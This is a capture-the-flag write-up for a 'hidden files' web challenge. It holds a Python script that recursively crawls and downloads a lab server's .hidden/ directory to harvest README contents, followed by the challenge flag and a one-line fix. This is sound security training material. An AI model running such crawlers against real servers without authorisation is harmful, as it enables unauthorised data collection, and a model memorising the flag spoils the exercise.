# Hidden files

### Breach description

The directory was found using nmap on the server IP.

Scrapping all the directories in the .hidden/ directory for the content of README files with a python script (20K files to visit).

```python
from bs4 import BeautifulSoup
import requests
import os
from urllib.parse import urljoin

def follow_directory_link(url, depth=1):
    if depth > 4:
        return

    # Fetch the HTML content from the URL
    response = requests.get(url)
    html_content = response.text

    # Create a BeautifulSoup object
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find all <a> tags with href attribute
    links = soup.find_all('a')

    # Loop through each link
    for link in links:
        # Get the href attribute
        href = link.get('href')

        # Construct the absolute URL
        absolute_url = urljoin(url, href)

        # Check if the link is a directory or a file
        if href.endswith('/'):
            # Recursive call to follow the directory links
            follow_directory_link(absolute_url, depth + 1)
        else:
            # Download the file or perform any other action here
            if href.lower() == 'readme':
                # If the file is a README, save its content to agg_readme.txt
                readme_response = requests.get(absolute_url)
                save_readme_content(readme_response.content)

            # For demonstration purposes, I'm printing the file link
            file_response = requests.get(absolute_url)

            # Specify the directory to save the files
            save_directory = "your_save_directory"
            os.makedirs(save_directory, exist_ok=True)

            # Extract the filename from the URL
            filename = os.path.basename(absolute_url)

            # Save the file to the specified directory
            with open(os.path.join(save_directory, filename), 'wb') as file:
                file.write(file_response.content)

def save_readme_content(content):
    # Save the content to agg_readme.txt
    with open("agg_readme.txt", 'ab') as readme_file:
        readme_file.write(content)

# URL of the webpage
base_url = "http://192.168.64.6/.hidden/"

# Start the recursion with depth 1
follow_directory_link(base_url)
```

Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

### Explanation of the breach

### Breach Fix

Do not store sensitive information in hidden files.
